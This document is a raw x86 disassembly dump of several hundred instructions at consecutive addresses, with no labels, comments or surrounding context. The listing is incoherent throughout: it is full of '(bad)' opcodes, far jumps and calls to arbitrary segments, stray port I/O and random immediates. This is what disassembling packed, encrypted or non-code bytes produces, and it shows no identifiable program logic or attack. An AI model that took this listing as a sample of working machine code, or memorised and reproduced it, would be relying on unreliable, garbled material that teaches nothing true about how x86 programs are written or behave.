  41a39e:	mov    ds:0x111ec3af,al
  41a3a3:	fdivr  DWORD PTR [edx]
  41a3a5:	push   edi
  41a3a6:	jecxz  0x41a3a9
  41a3a8:	ror    BYTE PTR [edx],0xa8
  41a3ab:	and    al,0x7b
  41a3ad:	pop    ebx
  41a3ae:	fstp   TBYTE PTR [ecx-0x7d]
  41a3b1:	mov    edx,0xbae04aa7
  41a3b6:	pop    ecx
  41a3b7:	(bad)  
  41a3b8:	js     0x41a346
  41a3ba:	stos   BYTE PTR es:[edi],al
  41a3bb:	not    BYTE PTR [ebp+0x5]
  41a3be:	push   edx
  41a3bf:	cmp    BYTE PTR [ebp-0x2a93672d],dh
  41a3c5:	ret    0xde2c
  41a3c8:	xor    ah,cl
  41a3ca:	ins    DWORD PTR es:[edi],dx
  41a3cb:	push   cs
  41a3cc:	or     al,0x52
  41a3ce:	push   esp
  41a3cf:	adc    cl,BYTE PTR [esi]
  41a3d1:	inc    esi
  41a3d2:	call   0x2cf2:0xc5924015
  41a3d9:	int3   
  41a3da:	push   esi
  41a3db:	mov    eax,DWORD PTR [edi-0x2a790d22]
  41a3e1:	ficom  WORD PTR [ecx+0x2e]
  41a3e4:	(bad)  
  41a3e5:	pop    esp
  41a3e6:	leave  
  41a3e7:	push   0xffffff85
  41a3e9:	ret    0xe135
  41a3ec:	repz lock iret 
  41a3ef:	mov    ebx,0x7f5ec5f8
  41a3f4:	jge    0x41a436
  41a3f6:	sub    ah,0x39
  41a3f9:	mov    edx,DWORD PTR ds:0xbb8507a9
  41a3ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a400:	jl     0x41a3c5
  41a402:	cmp    ecx,DWORD PTR [esi]
  41a404:	addr16 pop ebp
  41a406:	push   ebx
  41a407:	leave  
  41a408:	cmp    ebp,DWORD PTR [ebx]
  41a40a:	xor    eax,0x934a5b85
  41a40f:	jmp    DWORD PTR [esp+ebx*4+0x37]
  41a413:	inc    edi
  41a414:	out    dx,eax
  41a415:	retf   
  41a416:	add    DWORD PTR ds:0xa1a3eef9,edx
  41a41c:	xchg   BYTE PTR ds:[ebx+0x40],ch
  41a420:	xchg   esi,eax
  41a421:	ins    BYTE PTR es:[edi],dx
  41a422:	jle    0x41a3d0
  41a424:	mov    WORD PTR [ebx],ss
  41a426:	(bad)  
  41a427:	bnd js 0x41a403
  41a42a:	es test al,ah
  41a42d:	aas    
  41a42e:	dec    ecx
  41a42f:	pop    edx
  41a430:	push   ebp
  41a431:	in     eax,0x12
  41a433:	push   0x2bd6b05
  41a438:	dec    ebp
  41a439:	test   WORD PTR [ebp+ebx*1-0x6cfa2ce1],bp
  41a441:	ror    BYTE PTR [edx-0x46],1
  41a444:	imul   BYTE PTR [eax+edi*2-0x3c161db9]
  41a44b:	test   al,0xdd
  41a44d:	sbb    dh,bl
  41a44f:	xchg   edi,eax
  41a450:	shr    BYTE PTR [esi],cl
  41a452:	call   0x9bd5:0xc0d6ca21
  41a459:	sub    ebx,DWORD PTR [edi+0x1]
  41a45c:	je     0x41a497
  41a45e:	loop   0x41a3e3
  41a460:	xor    edi,eax
  41a462:	lock mov WORD PTR [edx+0x659133ce],fs
  41a469:	test   BYTE PTR [eax+0x46206a47],bh
  41a46f:	xor    edi,DWORD PTR [esi+0x32]
  41a472:	imul   eax,DWORD PTR [eax+0x5f],0x6c28e765
  41a479:	pop    ds
  41a47a:	mov    bl,0x24
  41a47c:	mov    cl,0xbd
  41a47e:	or     cl,dl
  41a480:	mov    ecx,0x1bec4087
  41a485:	jmp    0xe694:0x830e13ff
  41a48c:	jnp    0x41a4b4
  41a48e:	in     al,dx
  41a48f:	scas   al,BYTE PTR es:[edi]
  41a490:	addr16 sub edx,ebx
  41a493:	or     BYTE PTR [ecx+0x3932f00d],bh
  41a499:	rcl    DWORD PTR [esi+0x28da5ccc],1
  41a49f:	out    dx,al
  41a4a0:	sbb    al,0x0
  41a4a2:	(bad)  
  41a4a3:	jnp    0x41a4f6
  41a4a5:	mov    edi,0x627bee7e
  41a4aa:	(bad)  
  41a4ab:	sar    eax,0x45
  41a4ae:	retf   0xecc5
  41a4b1:	mov    al,ds:0xa365787d
  41a4b6:	push   edi
  41a4b7:	push   edx
  41a4b8:	ret    
  41a4b9:	outs   dx,BYTE PTR ds:[esi]
  41a4ba:	fs retf 0x76e0
  41a4be:	or     ebx,DWORD PTR [ecx]
  41a4c0:	aad    0x26
  41a4c2:	pop    es
  41a4c3:	inc    ebp
  41a4c4:	stos   BYTE PTR es:[edi],al
  41a4c5:	jne    0x41a528
  41a4c7:	or     al,0x45
  41a4c9:	dec    ebp
  41a4ca:	jo     0x41a518
  41a4cc:	cmp    BYTE PTR [edi+0x4e],ah
  41a4cf:	adc    eax,0x3cc3326a
  41a4d4:	mov    edx,0x4c26be0d
  41a4d9:	das    
  41a4da:	ins    BYTE PTR es:[edi],dx
  41a4db:	xchg   esi,eax
  41a4dc:	lods   al,BYTE PTR ds:[esi]
  41a4dd:	stc    
  41a4de:	(bad)  
  41a4df:	ins    DWORD PTR es:[edi],dx
  41a4e0:	pop    edx
  41a4e1:	pop    eax
  41a4e2:	test   eax,0x3b3430a1
  41a4e7:	pop    ds
  41a4e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4e9:	jle    0x41a49b
  41a4eb:	and    eax,0x98f79304
  41a4f0:	cwde   
  41a4f1:	imul   esi,DWORD PTR [ecx+0x29],0x96f4b6b9
  41a4f8:	loopne 0x41a4dc
  41a4fa:	inc    edx
  41a4fb:	out    0xd5,al
  41a4fd:	add    DWORD PTR [ebx+0x3bbb19d0],0x7e93ffcc
  41a507:	frstor [edx-0x17f2c4d7]
  41a50d:	push   ss
  41a50e:	imul   esp,DWORD PTR [ebp-0x8],0x14e6a173
  41a515:	retf   
  41a516:	int    0x63
  41a518:	ss loop 0x41a520
  41a51b:	and    DWORD PTR [ebp-0x6ee04f3],ebx
  41a521:	mov    esi,0xb5bd52d6
  41a526:	pop    ebx
  41a527:	mov    bl,0x6d
  41a529:	dec    edx
  41a52a:	push   ds
  41a52b:	pushw  0xa64d
  41a52f:	dec    edx
  41a530:	dec    esp
  41a531:	repnz lods al,BYTE PTR ds:[esi]
  41a533:	jle    0x41a58b
  41a535:	push   ebp
  41a536:	hlt    
  41a537:	into   
  41a538:	aas    
  41a539:	push   cs
  41a53a:	mov    ds:0xfaa60f17,al
  41a53f:	add    al,0x6e
  41a541:	dec    ebp
  41a542:	outs   dx,BYTE PTR ds:[esi]
  41a543:	mov    ?,WORD PTR [eax+edi*2]
  41a546:	xchg   esi,eax
  41a547:	icebp  
  41a548:	lods   al,BYTE PTR ds:[esi]
  41a549:	jbe    0x41a529
  41a54b:	push   esp
  41a54c:	test   DWORD PTR [eax+edi*2],ecx
  41a54f:	jmp    0xd038:0x43bc105
  41a556:	jecxz  0x41a4f1
  41a558:	push   eax
  41a559:	and    ch,BYTE PTR [ebx]
  41a55b:	rcr    BYTE PTR [eax],0xb
  41a55e:	add    DWORD PTR [edi-0x30],esi
  41a561:	(bad)  
  41a562:	xor    BYTE PTR [eax+ebp*4-0x6de3c71d],bl
  41a569:	cmp    al,BYTE PTR [ebx+0x4dc1337c]
  41a56f:	in     al,0x9b
  41a571:	jecxz  0x41a5d3
  41a573:	mov    esp,ecx
  41a575:	mov    esp,0x1a355cb3
  41a57a:	(bad)
  41a57d:	nop
  41a57e:	or     al,0x2d
  41a580:	mov    ah,BYTE PTR [edx]
  41a582:	inc    edi
  41a583:	fcom   DWORD PTR [eax+0x6d]
  41a586:	jp     0x41a5b6
  41a588:	cmp    DWORD PTR [ebx+0x27],eax
  41a58b:	aam    0xb6
  41a58d:	into   
  41a58e:	jmp    0xb6452039
  41a593:	xor    DWORD PTR [ebp-0x6bb11764],ebx
  41a599:	retf   0x1243
  41a59c:	xor    BYTE PTR [ecx],dl
  41a59e:	inc    esi
  41a59f:	sub    DWORD PTR [ebx+0x15ee54e5],esi
  41a5a5:	add    eax,0x22
  41a5a8:	pop    edx
  41a5a9:	scas   al,BYTE PTR es:[edi]
  41a5aa:	xor    al,0x27
  41a5ac:	stos   BYTE PTR es:[edi],al
  41a5ad:	or     al,0xa7
  41a5af:	popa   
  41a5b0:	ret    
  41a5b1:	pop    ebx
  41a5b2:	lock in al,0xd3
  41a5b5:	mov    ds:0x86bd047,eax
  41a5ba:	test   eax,0xd0e220ff
  41a5bf:	cmp    al,0xb6
  41a5c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5c2:	stos   DWORD PTR es:[edi],eax
  41a5c3:	ins    BYTE PTR es:[edi],dx
  41a5c4:	js     0x41a5c8
  41a5c6:	ret    0x90da
  41a5c9:	xchg   ecx,eax
  41a5ca:	jg     0x41a587
  41a5cc:	sbb    eax,ebp
  41a5ce:	or     esi,DWORD PTR [ecx]
  41a5d0:	xchg   ebx,eax
  41a5d1:	out    dx,eax
  41a5d2:	jp     0x41a602
  41a5d4:	xor    DWORD PTR [ecx],ecx
  41a5d6:	into   
  41a5d7:	xchg   esp,eax
  41a5d8:	sub    DWORD PTR [eax+ecx*4],ecx
  41a5db:	push   0xb534bdb
  41a5e0:	jle    0x41a5d1
  41a5e2:	xchg   esi,eax
  41a5e3:	dec    esi
  41a5e4:	and    esp,DWORD PTR [ebx+0x75bb9ff3]
  41a5ea:	or     eax,0x2a04566d
  41a5ef:	cmp    eax,DWORD PTR [esi+ecx*4-0x14]
  41a5f3:	clc    
  41a5f4:	adc    al,0x11
  41a5f6:	mov    ecx,0x4f266986
  41a5fb:	aas    
  41a5fc:	sbb    esp,DWORD PTR [eax]
  41a5fe:	mov    eax,ds:0xcb221c1e
  41a603:	mov    ecx,0x681e46f0
  41a608:	ds push 0xffffffa6
  41a60b:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41a60d:	xchg   esp,eax
  41a60e:	mov    al,ds:0x6f545e24
  41a613:	data16 jbe 0x41a647
  41a616:	sti    
  41a617:	pop    esi
  41a618:	test   al,0x55
  41a61a:	hlt    
  41a61b:	test   BYTE PTR [ebx],dl
  41a61d:	nop
  41a61e:	and    al,0x2b
  41a620:	out    0x2a,al
  41a622:	and    DWORD PTR [ecx-0x30],ebp
  41a625:	xor    ecx,ebx
  41a627:	adc    cl,dl
  41a629:	fdivp  st(0),st
  41a62b:	adc    BYTE PTR ds:[ecx+ebp*4-0x587d0be6],0xd0
  41a634:	mov    edx,0xd0998558
  41a639:	aam    0x9e
  41a63b:	inc    esp
  41a63c:	call   0xd8a2:0x21bf1eb4
  41a643:	sbb    BYTE PTR [ecx+eiz*2+0x57919819],al
  41a64a:	int    0xd0
  41a64c:	jp     0x41a5ee
  41a64e:	fldcw  WORD PTR [ecx+0x441bbc27]
  41a654:	mov    dh,dl
  41a656:	jns    0x41a67c
  41a658:	retf   
  41a659:	repnz push ebx
  41a65b:	icebp  
  41a65c:	in     eax,dx
  41a65d:	xchg   ecx,eax
  41a65e:	jbe    0x41a68f
  41a660:	in     al,dx
  41a661:	or     al,0x6f
  41a664:	xor    BYTE PTR [edx+0x1],dh
  41a667:	sbb    DWORD PTR [eax-0x65],eax
  41a66a:	or     DWORD PTR [edi+0x51],ebp
  41a66d:	dec    eax
  41a66e:	add    edi,ebp
  41a670:	sbb    al,0x9
  41a672:	pop    eax
  41a673:	add    esp,esi
  41a675:	mov    ebp,0x40e82dc7
  41a67a:	fcmovb st,st(7)
  41a67c:	mov    al,ds:0x84a48e0d
  41a681:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a682:	cli    
  41a683:	xchg   edi,eax
  41a684:	outs   dx,BYTE PTR ds:[esi]
  41a685:	fmul   DWORD PTR [ecx+0x17]
  41a688:	loope  0x41a671
  41a68a:	bound  ebp,QWORD PTR [eax]
  41a68c:	loope  0x41a6ab
  41a68e:	leave  
  41a68f:	jno    0x41a615
  41a691:	jns    0x41a676
  41a693:	fisub  DWORD PTR [edx+edx*1-0x2f]
  41a697:	call   0xae04:0xab8a7d99
  41a69e:	jge    0x41a688
  41a6a0:	retf   0x1497
  41a6a3:	push   esp
  41a6a4:	test   ebx,edi
  41a6a6:	loopne 0x41a633
  41a6a8:	jno    0x41a652
  41a6aa:	pop    eax
  41a6ab:	sbb    dl,ah
  41a6ad:	mul    BYTE PTR [edi+0x11]
  41a6b0:	adc    al,0x56
  41a6b2:	mov    cl,0x54
  41a6b4:	retf   
  41a6b5:	push   ss
  41a6b6:	cmp    eax,0xe27ad6eb
  41a6bb:	es fcmovnbe st,st(7)
  41a6be:	fldz   
  41a6c0:	adc    cl,BYTE PTR [edi+edx*4-0x3939aa91]
  41a6c7:	lds    ebp,FWORD PTR [edx]
  41a6c9:	push   esp
  41a6ca:	imul   edi,DWORD PTR [ecx+0x7126e420],0x65
  41a6d1:	dec    ecx
  41a6d2:	xlat   BYTE PTR ds:[ebx]
  41a6d3:	scas   al,BYTE PTR es:[edi]
  41a6d4:	ret    
  41a6d5:	jne    0x41a701
  41a6d7:	inc    esi
  41a6d8:	nop
  41a6d9:	pop    es
  41a6da:	and    bl,BYTE PTR [eax]
  41a6dc:	mov    eax,ds:0xd1626fef
  41a6e1:	inc    ebx
  41a6e2:	cmp    al,0x62
  41a6e4:	scas   eax,DWORD PTR es:[edi]
  41a6e5:	xor    edx,ecx
  41a6e7:	es clc 
  41a6e9:	and    dl,bl
  41a6eb:	daa    
  41a6ec:	fild   DWORD PTR [esi]
  41a6ee:	lock add bh,BYTE PTR [ecx-0x6d906564]
  41a6f5:	inc    DWORD PTR [edi-0x10d93d0b]
  41a6fb:	xor    DWORD PTR [esi-0x69f309cb],ebx
  41a701:	int3   
  41a702:	into   
  41a703:	adc    eax,0x2df4d7b5
  41a708:	jg     0x41a732
  41a70a:	inc    ebp
  41a70b:	add    al,0x4d
  41a70d:	into   
  41a70e:	mov    al,0x8e
  41a710:	popf   
  41a711:	stos   BYTE PTR es:[edi],al
  41a712:	push   edx
  41a713:	(bad)  
  41a714:	fwait
  41a715:	inc    ecx
  41a716:	or     edx,ecx
  41a718:	dec    edx
  41a719:	sbb    DWORD PTR [edx],0x365268a7
  41a71f:	loop   0x41a781
  41a721:	add    al,0x6
  41a723:	rol    DWORD PTR [edi-0x31],0x75
  41a727:	inc    edi
  41a728:	push   cs
  41a729:	int3   
  41a72a:	ss jmp 0x3b2b:0xe79d7e05
  41a732:	dec    esp
  41a733:	ret    0x9306
  41a736:	adc    eax,0x3a78eda9
  41a73b:	popf   
  41a73c:	stc    
  41a73d:	out    dx,al
  41a73e:	sbb    ebp,ebp
  41a740:	adc    ecx,DWORD PTR [edi+0x21]
  41a743:	sbb    ah,BYTE PTR ds:0x336661b0
  41a749:	icebp  
  41a74a:	pop    ds
  41a74b:	jne    0x41a7c5
  41a74d:	jp     0x41a7b8
  41a74f:	sbb    ebp,DWORD PTR [esi-0x44]
  41a752:	xchg   edi,eax
  41a753:	push   0x8d5fe2e8
  41a758:	sbb    esi,DWORD PTR [ebp-0x41ff5243]
  41a75e:	outs   dx,BYTE PTR ds:[esi]
  41a75f:	loope  0x41a751
  41a761:	push   ecx
  41a762:	inc    esp
  41a763:	int    0xb0
  41a765:	push   es
  41a766:	daa    
  41a767:	pop    ebp
  41a768:	sbb    eax,DWORD PTR [eax-0x786d8118]
  41a76e:	pop    ebp
  41a76f:	ret    
  41a770:	dec    ecx
  41a771:	hlt    
  41a772:	pop    edi
  41a773:	cmp    BYTE PTR [ebp+0x24d43e1d],0x4b
  41a77a:	sub    esi,edi
  41a77c:	dec    edi
  41a77d:	jne    0x41a72e
  41a77f:	imul   esp,DWORD PTR [edx+0x57ea89a3],0x5c
  41a786:	scas   al,BYTE PTR es:[edi]
  41a787:	ins    DWORD PTR es:[edi],dx
  41a788:	push   es
  41a789:	mov    ds:0x69574a30,eax
  41a78e:	jns    0x41a795
  41a790:	fistp  DWORD PTR [edx]
  41a792:	data16 mov BYTE PTR [ecx],bh
  41a795:	adc    bl,BYTE PTR [edi+0x77]
  41a798:	cwde   
  41a799:	cld    
  41a79a:	push   DWORD PTR [ecx+0x16]
  41a79d:	iret   
  41a79e:	aad    0x2e
  41a7a0:	loop   0x41a743
  41a7a2:	push   esi
  41a7a3:	cwde   
  41a7a4:	in     eax,0xf5
  41a7a6:	aad    0x7d
  41a7a8:	jnp    0x41a783
  41a7aa:	mov    ebp,0x75921bba
  41a7af:	call   0x176a94ca
  41a7b4:	call   0x62bef7e1
  41a7b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a7ba:	outs   dx,BYTE PTR ds:[esi]
  41a7bb:	int3   
  41a7bc:	mov    ebx,ss
  41a7be:	jnp    0x41a83a
  41a7c0:	add    eax,0x3ae837b6
  41a7c5:	jns    0x41a78f
  41a7c7:	les    edx,FWORD PTR [esi+0x72b2ed10]
  41a7cd:	ins    DWORD PTR es:[edi],dx
  41a7ce:	mov    al,ds:0x9e7c0446
  41a7d3:	sbb    eax,0x96e3e803
  41a7d8:	ja     0x41a847
  41a7da:	mov    al,0x5e
  41a7dc:	or     eax,0x5b1b0042
  41a7e1:	mov    bh,0x12
  41a7e3:	mov    cl,0xf0
  41a7e5:	cwde   
  41a7e6:	or     eax,0xccc58925
  41a7eb:	aam    0x75
  41a7ed:	sbb    edx,DWORD PTR [edx-0x607a20db]
  41a7f3:	ins    BYTE PTR es:[edi],dx
  41a7f4:	stc    
  41a7f5:	and    WORD PTR [edi],0xceee
  41a7fa:	xchg   ebx,eax
  41a7fb:	cwde   
  41a7fc:	jp     0x41a826
  41a7fe:	xlat   BYTE PTR ds:[ebx]
  41a7ff:	bound  ebp,QWORD PTR [eax+esi*8]
  41a802:	pop    ebp
  41a803:	or     ebx,DWORD PTR [ebx]
  41a805:	retf   0xbbda
  41a808:	out    0xef,al
  41a80a:	cmp    BYTE PTR [edi+ecx*4-0x1b0b1faa],ch
  41a811:	or     ebx,DWORD PTR [ebx+eax*4+0x67]
  41a815:	mov    dh,0x67
  41a817:	cmp    dh,dl
  41a819:	dec    edi
  41a81a:	test   eax,0x757c9abb
  41a81f:	stos   BYTE PTR es:[edi],al
  41a820:	xchg   ecx,eax
  41a821:	int    0xef
  41a823:	dec    ebx
  41a824:	push   esp
  41a825:	fst    QWORD PTR [edx]
  41a827:	ins    DWORD PTR es:[edi],dx
  41a828:	fdivr  DWORD PTR [ecx]
  41a82a:	pop    esp
  41a82b:	test   DWORD PTR [eax+0x4b],ebx
  41a82e:	inc    ecx
  41a82f:	sar    DWORD PTR [esi-0x1e08a5f2],0x62
  41a836:	mov    ah,0x91
  41a838:	(bad)  
  41a83a:	ins    DWORD PTR es:[edi],dx
  41a83b:	mov    edi,0x89420e36
  41a840:	retf   
  41a841:	sbb    al,0xbd
  41a843:	aam    0xa5
  41a845:	sbb    al,0xa8
  41a847:	mov    BYTE PTR [ecx+0x65],ah
  41a84a:	pop    es
  41a84b:	cdq    
  41a84c:	mov    ebp,0x8de5a20a
  41a851:	mov    bh,0xcf
  41a853:	and    BYTE PTR [ebx+0x7f],al
  41a856:	sahf   
  41a857:	(bad)  
  41a858:	out    0x2,al
  41a85a:	mov    bl,0xa7
  41a85c:	or     eax,edi
  41a85e:	int    0xb9
  41a860:	add    edi,DWORD PTR [edi]
  41a862:	setno  dh
  41a865:	mov    bl,0x4f
  41a867:	push   edi
  41a868:	add    eax,DWORD PTR [edi-0x71]
  41a86b:	sti    
  41a86c:	popa   
  41a86d:	js     0x41a876
  41a86f:	loopne 0x41a866
  41a871:	cld    
  41a872:	xchg   ebp,eax
  41a873:	popf   
  41a874:	gs inc ebp
  41a876:	addr16 dec ebp
  41a878:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a879:	cwde   
  41a87a:	cmp    al,0x7c
  41a87c:	in     eax,0xb3
  41a87e:	outs   dx,DWORD PTR ds:[esi]
  41a87f:	xchg   edx,eax
  41a880:	aas    
  41a881:	dec    ebx
  41a882:	fisub  WORD PTR [ebx+ebx*4-0x1c769228]
  41a889:	sub    al,BYTE PTR [eax+esi*8]
  41a88c:	scas   eax,DWORD PTR es:[edi]
  41a88d:	test   eax,0xd209f3e6
  41a892:	cmp    al,0x19
  41a894:	mov    eax,0xacb62801
  41a899:	or     ecx,DWORD PTR [ebx+0x31c4c150]
  41a89f:	fsubr  QWORD PTR [eax-0x7eff764f]
  41a8a5:	sub    bh,BYTE PTR [esi-0x56]
  41a8a8:	and    ebp,DWORD PTR [ebp-0x7cab2322]
  41a8ae:	sbb    al,0xe4
  41a8b0:	leave  
  41a8b1:	push   esp
  41a8b2:	int3   
  41a8b3:	mov    ecx,0xfe99fb3f
  41a8b8:	not    DWORD PTR [ebp+0x45]
  41a8bb:	test   eax,0x902fdc68
  41a8c0:	sti    
  41a8c1:	psubusb mm6,QWORD PTR [ebx-0x71]
  41a8c5:	ins    BYTE PTR es:[edi],dx
  41a8c6:	stos   BYTE PTR es:[edi],al
  41a8c7:	shl    BYTE PTR [ecx-0xe2e7844],1
  41a8cd:	lds    ecx,FWORD PTR [esi+0x4f]
  41a8d0:	xchg   BYTE PTR [ecx+0x7],dl
  41a8d3:	xchg   esi,eax
  41a8d4:	xchg   edx,eax
  41a8d5:	push   esp
  41a8d6:	aas    
  41a8d7:	mov    dl,0xcf
  41a8d9:	sbb    ah,BYTE PTR [eax+0x51]
  41a8dc:	add    eax,0x120a87d8
  41a8e1:	ins    BYTE PTR es:[edi],dx
  41a8e2:	(bad)  
  41a8e3:	call   0x90fc4cd
  41a8e8:	jge    0x41a925
  41a8ea:	push   edi
  41a8eb:	adc    ah,BYTE PTR [edi]
  41a8ed:	xchg   esp,eax
  41a8ee:	or     ah,0xd1
  41a8f1:	pop    es
  41a8f2:	fsub   st(4),st
  41a8f4:	mov    cl,0x49
  41a8f6:	scas   al,BYTE PTR es:[edi]
  41a8f7:	dec    edi
  41a8f8:	aas    
  41a8f9:	xor    bl,BYTE PTR [edx+0x7]
  41a8fc:	loope  0x41a94b
  41a8fe:	mov    dl,bh
  41a900:	test   BYTE PTR [ecx],dh
  41a902:	mov    ds,WORD PTR [edx]
  41a904:	fld    DWORD PTR [eax+0x1a]
  41a907:	cmp    al,al
  41a909:	aam    0x7e
  41a90b:	fcom   DWORD PTR [ebx-0x11]
  41a90e:	mov    esp,0x10b37afb
  41a913:	gs mov edx,0x90213adb
  41a919:	imul   edi,esp,0x2dd999d8
  41a91f:	jmp    0x41a92d
  41a921:	in     al,0xb7
  41a923:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a924:	sti    
  41a925:	adc    DWORD PTR [ebp+0x68],ebx
  41a928:	div    BYTE PTR [ecx+0x14]
  41a92b:	addr16 inc esi
  41a92d:	aaa    
  41a92e:	(bad)  
  41a930:	jp     0x41a8cc
  41a932:	hlt    
  41a933:	stos   BYTE PTR es:[edi],al
  41a934:	aas    
  41a935:	cmc    
  41a936:	mov    edx,0x9a7af0b6
  41a93b:	lea    ecx,[edx]
  41a93d:	hlt    
  41a93e:	mov    al,0xb2
  41a940:	nop
  41a941:	xchg   esp,eax
  41a942:	repz fild WORD PTR [ebx+ecx*4-0x62]
  41a947:	call   0x4d7491eb
  41a94c:	ins    DWORD PTR es:[edi],dx
  41a94d:	mov    bl,0x32
  41a94f:	fsubr  st,st(0)
  41a951:	push   esi
  41a952:	add    ch,BYTE PTR [edx-0x6a]
  41a955:	jmp    0x701f:0x895949f6
  41a95c:	(bad)  
  41a95e:	fisubr DWORD PTR [ecx+0x6e]
  41a961:	cmc    
  41a962:	dec    esi
  41a963:	xchg   edx,eax
  41a964:	and    esi,DWORD PTR [ecx-0x18]
  41a967:	cmp    ecx,esp
  41a969:	jmp    0x85c5:0xb469bd60
  41a970:	ds xor eax,0xc0cf98d6
  41a976:	inc    edi
  41a977:	ins    BYTE PTR es:[edi],dx
  41a978:	stos   BYTE PTR es:[edi],al
  41a979:	push   ebp
  41a97a:	fild   DWORD PTR [ebp+0x38]
  41a97d:	ds repz xor dl,0x4a
  41a982:	outs   dx,DWORD PTR ds:[esi]
  41a983:	adc    al,0xea
  41a985:	(bad)  
  41a986:	je     0x41a94b
  41a988:	out    0x92,al
  41a98a:	fld    TBYTE PTR [esi+0x69]
  41a98d:	dec    ebp
  41a98e:	aad    0xb3
  41a990:	cmp    eax,0x85caafae
  41a995:	enter  0x73f3,0xe5
  41a999:	(bad)  
  41a99a:	out    0xe2,eax
  41a99c:	push   ds
  41a99d:	call   FWORD PTR [edi+eiz*2+0x69ec6512]
  41a9a4:	adc    DWORD PTR [ebp+0x7a6de1dc],0x4cc0f971
  41a9ae:	inc    esp
  41a9af:	sti    
  41a9b0:	pop    es
  41a9b1:	clc    
  41a9b2:	es cld 
  41a9b4:	push   edx
  41a9b5:	enter  0x3793,0xf2
  41a9b9:	clc    
  41a9ba:	pop    ecx
  41a9bb:	push   esi
  41a9bc:	xchg   edx,eax
  41a9bd:	jns    0x41a9eb
  41a9bf:	add    al,0x1c
  41a9c1:	lods   eax,DWORD PTR ds:[esi]
  41a9c2:	loope  0x41a96b
  41a9c4:	fist   WORD PTR [esi+0x7]
  41a9c7:	mov    al,ds:0xcf44f939
  41a9cc:	mov    eax,ds:0xc9e8dae
  41a9d1:	adc    ebp,DWORD PTR [eax-0x64]
  41a9d4:	data16 add al,BYTE PTR ds:0x366fdbd1
  41a9db:	push   edx
  41a9dc:	outs   dx,BYTE PTR ds:[esi]
  41a9dd:	inc    esp
  41a9de:	retf   0xf513
  41a9e1:	sub    BYTE PTR [ebx],ch
  41a9e3:	dec    edx
  41a9e4:	arpl   WORD PTR [esi],bx
  41a9e6:	lock or BYTE PTR [ebp+0x73],0xcd
  41a9eb:	inc    edx
  41a9ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9ed:	std    
  41a9ee:	mov    ebp,0x66d1b9ba
  41a9f3:	mov    cl,0xd2
  41a9f5:	outs   dx,BYTE PTR ds:[esi]
  41a9f6:	mov    bl,0xee
  41a9f8:	or     eax,0x27609581
  41a9fd:	scas   al,BYTE PTR es:[edi]
  41a9fe:	popa   
  41a9ff:	jle    0x41a9a2
  41aa01:	jbe    0x41aa5a
  41aa03:	pop    es
  41aa04:	arpl   WORD PTR [ecx-0x76],di
  41aa07:	push   edi
  41aa08:	xchg   esp,eax
  41aa09:	aaa    
  41aa0a:	push   ecx
  41aa0b:	pushf  
  41aa0c:	sbb    al,0xf7
  41aa0e:	dec    esp
  41aa0f:	xor    ch,BYTE PTR [esi]
  41aa11:	add    BYTE PTR [ebx-0x47],al
  41aa14:	xchg   bh,al
  41aa16:	in     al,0x7a
  41aa18:	or     al,0x7e
  41aa1a:	jle    0x41aa83
  41aa1c:	push   esp
  41aa1d:	add    BYTE PTR [edx-0x7fe1057f],0x1a
  41aa24:	fwait
  41aa25:	and    eax,0x8d57d99b
  41aa2a:	jnp    0x41aa09
  41aa2c:	push   ds
  41aa2d:	jecxz  0x41aa10
  41aa2f:	adc    bh,0xc2
  41aa32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa33:	mov    ecx,0xbc75c597
  41aa38:	adc    esp,ebp
  41aa3a:	sbb    DWORD PTR [eax-0x4f],ebp
  41aa3d:	add    al,BYTE PTR [ebp+ebx*8-0xbb8f9c2]
  41aa44:	jmp    0x41a9d6
  41aa46:	std    
  41aa47:	cmp    BYTE PTR [ecx+0x52664591],bh
  41aa4d:	loop   0x41aab2
  41aa4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa50:	cld    
  41aa51:	leave  
  41aa52:	lock sbb eax,0xa6cdeaca
  41aa58:	push   ss
  41aa59:	sub    edx,DWORD PTR [ebx-0x6f]
  41aa5c:	dec    edx
  41aa5d:	sub    BYTE PTR [esi+0x190b0bf2],al
  41aa63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa64:	fisttp WORD PTR [eax]
  41aa66:	scas   al,BYTE PTR es:[edi]
  41aa67:	pop    si
  41aa69:	mov    eax,0x5b77c8ea
  41aa6e:	adc    al,0xa2
  41aa70:	fadd   DWORD PTR [esp+edi*1]
  41aa73:	lea    esp,[esi-0x46]
  41aa76:	lods   al,BYTE PTR ds:[esi]
  41aa77:	mov    al,0x1a
  41aa79:	push   edx
  41aa7a:	ja     0x41aa21
  41aa7c:	add    ebx,esp
  41aa7e:	or     al,0x2a
  41aa80:	push   es
  41aa81:	mov    dh,ah
  41aa83:	xchg   ebp,eax
  41aa84:	or     al,0x2a
  41aa86:	test   al,0xce
  41aa88:	or     DWORD PTR [ebx+0x6b],edi
  41aa8b:	fld    DWORD PTR [ebp+0x48]
  41aa8e:	(bad)  
  41aa8f:	xor    ch,BYTE PTR [eax]
  41aa91:	out    0x81,al
  41aa93:	stos   BYTE PTR es:[edi],al
  41aa94:	sahf   
  41aa95:	sbb    bl,BYTE PTR [edi+0x4642ef1a]
  41aa9b:	daa    
  41aa9c:	scas   al,BYTE PTR es:[edi]
  41aa9d:	cs call 0xb3e7:0xe0be7efe
  41aaa5:	sbb    DWORD PTR [edi-0x20],edi
  41aaa8:	inc    ecx
  41aaa9:	sbb    eax,0xf2dc3b1d
  41aaae:	fistp  DWORD PTR [esi-0xec7610a]
  41aab4:	fwait
  41aab5:	or     eax,0xa15f1327
  41aaba:	sbb    edx,DWORD PTR [eax+0x56f7cfb9]
  41aac0:	loope  0x41aa91
  41aac2:	sbb    BYTE PTR [esp+esi*2-0x1792ad93],bh
  41aac9:	inc    ecx
  41aaca:	inc    edx
  41aacb:	dec    ecx
  41aacc:	push   ebp
  41aacd:	test   al,0xba
  41aacf:	test   DWORD PTR [ecx+0x2be9b5],esp
  41aad5:	mov    eax,DWORD PTR [ebp-0xe]
